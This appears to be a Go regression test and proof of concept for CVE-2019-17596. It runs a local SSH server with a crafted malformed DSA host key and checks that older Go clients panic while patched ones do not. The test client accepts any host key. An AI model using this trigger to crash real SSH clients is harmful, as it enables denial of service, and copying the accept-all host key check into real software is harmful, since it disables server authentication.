package poc_dsa_parser_CVE_2019_17596

import (
	"fmt"
	"github.com/gliderlabs/ssh"
	"github.com/stretchr/testify/require"
	gossh "golang.org/x/crypto/ssh"
	"math/big"
	"net"
	"testing"
)

func TestSSHClientHostKey(t *testing.T) {
	port, err := getRandomPort()
	require.NoError(t, err)
	addr := fmt.Sprintf("127.0.0.1:%d", port)

	priv := examplePriaveKey()
	priv.PublicKey.Q.SetInt64(128)
	fs := &fakeSigner{
		R:      new(big.Int).SetInt64(2),
		S:      new(big.Int).SetInt64(2),
		public: priv.PublicKey,
	}

	sshSigner, err := gossh.NewSignerFromSigner(fs)
	require.NoError(t, err)
	s := &ssh.Server{
		Addr: addr,
		Handler: func(session ssh.Session) {
			defer session.Close()
			session.Write([]byte("hello world\n"))
		},
	}
	s.AddHostKey(sshSigner)
	ln, err := net.Listen("tcp", addr)
	require.NoError(t, err)
	defer ln.Close()
	go s.Serve(ln)

	clientConfig := &gossh.ClientConfig{
		HostKeyCallback: func(hostname string, remote net.Addr, key gossh.PublicKey) error {
			return nil
		},
	}

	tf := func() {
		conn, err := gossh.Dial("tcp", addr, clientConfig)
		require.NoError(t, err)
		defer conn.Close()
	}
	major, minor, patch := goVersion(t)
	if major >= 1 && minor >= 13 && patch >= 3 || (major >= 1 && minor > 13) {
		require.NotPanics(t, tf)
	} else {
		require.Panics(t, tf)
	}
}
